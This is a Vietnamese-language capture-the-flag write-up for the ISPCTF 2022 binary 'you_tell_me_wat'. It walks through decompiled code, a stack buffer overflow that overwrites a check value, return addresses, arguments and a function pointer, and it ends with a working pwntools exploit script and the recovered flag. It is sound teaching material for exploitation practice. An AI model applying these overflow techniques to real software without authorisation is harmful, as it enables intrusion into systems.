## YouTellMeWat
# 1. Overview
```
iluvinn in ~/pwn/ispctf2022 λ checksec you_tell_me_wat
[*] '/home/iluvinn/pwn/ispctf2022/you_tell_me_wat'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
iluvinn in ~/pwn/ispctf2022 λ
```
Có thể thấy toàn bộ flag của file đều được tắt và đây là 1 file binary x86

# 2. Phân tích
Disassemble binary file ta được

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("=================================");
  puts("| Welcome to ISPCTF  2022       |");
  puts("| Have fun with these challenge |");
  puts("|           --Author-- Iluvinn  |");
  puts("=================================");
  flag1 = readflag("fake.flag");
  flag2 = readflag("fake.flag");
  flag3 = readflag("fake.flag");
  ((void (__cdecl *)(int *))vuln)(&argc);
  return MEMORY[0];
}

int (__cdecl *vuln())(int, int)
{
  int (__cdecl *result)(int, int); // eax
  char s[32]; // [esp+Ch] [ebp-2Ch] BYREF
  int v2; // [esp+2Ch] [ebp-Ch]
  int (__cdecl *retaddr)(int, int); // [esp+3Ch] [ebp+4h]

  v2 = 0;
  puts("What your name?");
  fgets(s, 500, stdin);
  puts("Hi ");
  puts(s);
  puts("Let's me check your token");
  if ( v2 != 322376503 )
  {
    puts("I want 0x13371337");
    exit(0);
  }
  puts("Greate here your flag");
  flag1 = (const char *)readflag("B4n4n4.flag");
  puts(flag1);
  puts("Go deeper to get flag");
  puts("Your may need some thing '%$!@#' to continue");
  result = retaddr;
  if ( wat1 != retaddr )
    nah();
  return result;
}

int (*__cdecl wat1(int a1, int a2))()
{
  int (*result)(); // eax
  int (*retaddr)(); // [esp+Ch] [ebp+4h]

  puts((const char *)&unk_8048CD2);
  puts("==================================================");
  puts("We meet again let's me check your stuff you carry with");
  if ( a1 != 1987406921 )
  {
    puts("Right direction but miss a little lucky");
    exit(0);
  }
  puts("Okay gud, go on");
  if ( a2 != 1852729677 )
  {
    puts("Nah!!! you must try harder");
    exit(0);
  }
  puts("Okay gud, take your gift");
  puts("Here your 2nd flag");
  flag2 = (const char *)readflag("Iluvinn.flag");
  puts(flag2);
  result = retaddr;
  if ( wat2 != retaddr )
    nah();
  return result;
}

int wat2()
{
  int v0; // eax
  char s[60]; // [esp+0h] [ebp-48h] BYREF
  int (__cdecl *v3)(char *); // [esp+3Ch] [ebp-Ch]

  puts((const char *)&unk_8048CD2);
  puts("==========================");
  puts("How did you get here?");
  puts("Nvm, just finish this if you can");
  puts("Oh, and the last piece of flag is 'ISPCTF2022.flag'");
  puts("I'll give you my lazy prog =='");
  puts("Have fun~~");
  v3 = notfun;
  puts("[ + ] Ok4y, t3ll sth m4k3 me f^n: ");
  fgets(s, 65, stdin);
  v0 = v3(s);
  if ( v0 )
    flag3 = v0;
  return print_flag();
}

void __noreturn nah()
{
  puts("Nah, you can't come here, hehe!!!");
  exit(0);
}

int __cdecl notfun(char *s)
{
  size_t i; // [esp+8h] [ebp-10h]
  int v3; // [esp+Ch] [ebp-Ch]

  v3 = 0;
  for ( i = 0; i < strlen(s); ++i )
    v3 += s[i];
  if ( v3 == 322376503 )
  {
    puts("[ + ] tak3 iT");
    flag3 = readflag("ISPCTF2022.flag");
    print_flag();
  }
  else
  {
    puts("[ + ] s0 b0r1Ng");
  }
  return 0;
}

int print_flag()
{
  puts(flag1);
  puts(flag2);
  return puts((const char *)flag3);
}

char *__cdecl readflag(char *filename)
{
  char *s; // [esp+8h] [ebp-10h]
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen(filename, "r");
  if ( !stream )
    puts("'flag' file doesn't exist!!!");
  s = (char *)malloc(0x1Eu);
  fgets(s, 30, stream);
  fclose(stream);
  return s;
}
```

Hãy tiến hành phân tích từ main trước. 
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("=================================");
  puts("| Welcome to ISPCTF  2022       |");
  puts("| Have fun with these challenge |");
  puts("|           --Author-- Iluvinn  |");
  puts("=================================");
  flag1 = readflag("fake.flag");
  flag2 = readflag("fake.flag");
  flag3 = readflag("fake.flag");
  ((void (__cdecl *)(int *))vuln)(&argc);
  return MEMORY[0];
}
```

Ngay mắt nhìn ta thấy có hàm `readflag(char *str)`, hàm này sẽ đọc file và copy nội dung file vào heap và trả về pointer trỏ tới string đã copy vào
```
char *__cdecl readflag(char *filename)
{
  char *s; // [esp+8h] [ebp-10h]
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen(filename, "r");
  if ( !stream )
    puts("'flag' file doesn't exist!!!");
  s = (char *)malloc(0x1Eu);
  fgets(s, 30, stream);
  fclose(stream);
  return s;
}
```

sau khi đọc 3 fake flag ta có hàm `vuln()` là 1 hàm đáng để quan tâm
```
int (__cdecl *vuln())(int, int)
{
  int (__cdecl *result)(int, int); // eax
  char s[32]; // [esp+Ch] [ebp-2Ch] BYREF
  int v2; // [esp+2Ch] [ebp-Ch]
  int (__cdecl *retaddr)(int, int); // [esp+3Ch] [ebp+4h]

  v2 = 0;
  puts("What your name?");
  fgets(s, 500, stdin);
  puts("Hi ");
  puts(s);
  puts("Let's me check your token");
  if ( v2 != 322376503 )
  {
    puts("I want 0x13371337");
    exit(0);
  }
  puts("Greate here your flag");
  flag1 = (const char *)readflag("B4n4n4.flag");
  puts(flag1);
  puts("Go deeper to get flag");
  puts("Your may need some thing '%$!@#' to continue");
  result = retaddr;
  if ( wat1 != retaddr )
    nah();
  return result;
}
```
Ngay lập tức nhận thấy, có hàm `fgets` được sử dụng, thật không may vì có thể ta sẽ không thể thực hiện `buffer overflow` được. 
[ + ] Nhưng nhìn nhận lại 1 chút thì hàm `fgets` sẽ dọc 500 kí tự và chỉ dừng khi đọc đến kí tự `\n`.
[ + ] Mảng kí tự đọc vào chỉ có kích thước là 32.
=> Vẫn có thể sử dụng `buffer overflow`.

Sau khi đọc input sẽ tiến hành check giá trị biến `v2` với giá trị `0x13371337`. Char s[32] bắt đầu tại `[ebp-2Ch]` và biến v2 tại `[ebp-Ch]`
Để trực quan có thể hình dung `stack` như sau
```
|----------| low address
|    v2    |
|----------|
|          |
|          |
|   s[32]  |
|          |
|          |
|----------| high address
```
Khi tiến hành đọc vào `s` nếu đọc trên 32 kí tự thì kí tự thứ 33 sẽ ghi đè lên giá trị hiện tại của biến v2, áp dụng vào đó ta hoàn toàn có thể modify biến `v2` thành giá trị `0x13371337`

Qua được phần kiểm tra biến v2 ta sẽ có được phần flag đầu tiên.

Tiếp đến lại gặp thêm 1 lần kiểm tra nữa nhưng lần này là kiểm tra địa chỉ trả về hay giá trị của `eip` phải bằng với giá trị của hàm `wat1(a,b)`, ở đây tiếp tục dùng `BOF` để có thể modify giá trị `eip` được lưu trên stack
`stack layout` như sau
```
|-----------| low address
| saved eip |
|-----------|
| saved ebp |
|-----------|
|   ...     |
|-----------| 
|    v2     |
|-----------|
|           |
|           |
|   s[32]   |
|           |
|           |
|-----------| high address
```

Xử lí xong tiến hành check hàm `wat1(a,b)`
```
int (*__cdecl wat1(int a1, int a2))()
{
  int (*result)(); // eax
  int (*retaddr)(); // [esp+Ch] [ebp+4h]

  puts((const char *)&unk_8048CD2);
  puts("==================================================");
  puts("We meet again let's me check your stuff you carry with");
  if ( a1 != 1987406921 )
  {
    puts("Right direction but miss a little lucky");
    exit(0);
  }
  puts("Okay gud, go on");
  if ( a2 != 1852729677 )
  {
    puts("Nah!!! you must try harder");
    exit(0);
  }
  puts("Okay gud, take your gift");
  puts("Here your 2nd flag");
  flag2 = (const char *)readflag("Iluvinn.flag");
  puts(flag2);
  result = retaddr;
  if ( wat2 != retaddr )
    nah();
  return result;
}
```

Hàm này tiến hành kiểm tra 2 giá trị truyền vào khi gọi hàm, sẽ nên để ý một chút khi viết payload ta cần truyền vào 2 param lần lượt có giá trị là `1987406921` và `1852729677` sau đó sẽ lấy được mảnh flag tiếp theo. Cũng tương tự như ở `vuln` hàm `wat1` có phần check return address bằng `wat2`. 
Tương tự, dùng `BOF` modify retaddr thành wat2

Disassemble `wat2()`
```
int wat2()
{
  int v0; // eax
  char s[60]; // [esp+0h] [ebp-48h] BYREF
  int (__cdecl *v3)(char *); // [esp+3Ch] [ebp-Ch]

  puts((const char *)&unk_8048CD2);
  puts("==========================");
  puts("How did you get here?");
  puts("Nvm, just finish this if you can");
  puts("Oh, and the last piece of flag is 'ISPCTF2022.flag'");
  puts("I'll give you my lazy prog =='");
  puts("Have fun~~");
  v3 = notfun;
  puts("[ + ] Ok4y, t3ll sth m4k3 me f^n: ");
  fgets(s, 65, stdin);
  v0 = v3(s);
  if ( v0 )
    flag3 = v0;
  return print_flag();
}
```

Stack layout mong muốn
```
| 2nd param | low address
|-----------|
| 1st param | 
|-----------|
|   wat2    |
|-----------| 
|   wat1    |
|-----------|
| saved ebp |
|-----------| 
|    v2     |
|-----------|
|   s[32]   |
|           |
|-----------| high address
```

Tại wat2 sau khi nhập input sẽ gọi hàm `v3(s)` hay `notfun(s)`, hàm `notfun` sẽ tiến hành chấm điểm cho chuỗi nhập vào nếu số điểm bằng `322376503 (0x13371337)` sẽ pass và lấy được mảnh flag cuối cùng
```
int __cdecl notfun(char *s)
{
  size_t i; // [esp+8h] [ebp-10h]
  int v3; // [esp+Ch] [ebp-Ch]

  v3 = 0;
  for ( i = 0; i < strlen(s); ++i )
    v3 += s[i];
  if ( v3 == 322376503 )
  {
    puts("[ + ] tak3 iT");
    flag3 = readflag("ISPCTF2022.flag");
    print_flag();
  }
  else
  {
    puts("[ + ] s0 b0r1Ng");
  }
  return 0;
}
```
Cơ chế tính điểm của hàm rất đơn giản, cộng giá trị của kí tự trong chuỗi để ra số điểm
Vấn đề là giá trị tối đa của s[i] là 255 (0xff) => giá trị tối đa ta có thể đạt được là 0xff x 60 = 15300 điểm. Quá nhỏ so với số điểm cần đạt.
Cách giải quyết rất đơn giản, thay đổi giá trị v3 trong hàm wat2, từ đó thay vì gọi hàm notfun hãy control đến thẳng vị trí mong muốn `(readflag thứ 3)`

# 3. Viết payload
```
from pwn import *
p = process("./you_tell_me_wat")
#p = remote("4.tcp.ngrok.io", 15961)
wat1 = 0x0804887d #0x0804880d
wat2 = 0x08048795 #0x08048725
win = p32(0x08048727) #p32(0x80486B7)
# gdb.attach(p)

pl =  32*"A"+p32(0x13371337) # modify bypass check value
pl += "A"*(48-36) # padding payload
pl += p32(wat1) + p32(wat2) + p32(1987406921) + p32(1852729677) # 2 param to check in wat1 and return address to wat2

p.sendline(pl)

pl = 'A'*60+win # modify v3 = notfun to address point to read 3rd flag
p.sendline(pl)

p.interactive()
```

# 4. Kết quả
```
[+] Starting local process './you_tell_me_wat': pid 95742
[*] Switching to interactive mode
=================================
| Welcome to ISPCTF  2022       |
| Have fun with these challenge |
|           --Author-- Iluvinn  |
=================================
What your name?
Hi 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7\x13\x13AAAAAAAAAAA}\x88\x04\x95\x87\x04IluvMinn

Let's me check your token
Greate here your flag
ISPCTF{B0

Go deeper to get flag
Your may need some thing '%$!@#' to continue

==================================================
We meet again let's me check your stuff you carry with
Okay gud, go on
Okay gud, take your gift
Here your 2nd flag
unD_4nD_jU


==========================
How did you get here?
Nvm, just finish this if you can
Oh, and the last piece of flag is 'ISPCTF2022.flag'
I'll give you my lazy prog =='
Have fun~~
[ + ] Ok4y, t3ll sth m4k3 me f^n: 
ISPCTF{B0

unD_4nD_jU

Mp_42346E346E34}

[*] Got EOF while reading in interactive
$ 
```

flag: `ISPCTF{B0unD_4nD_jUMp_42346E346E34}`
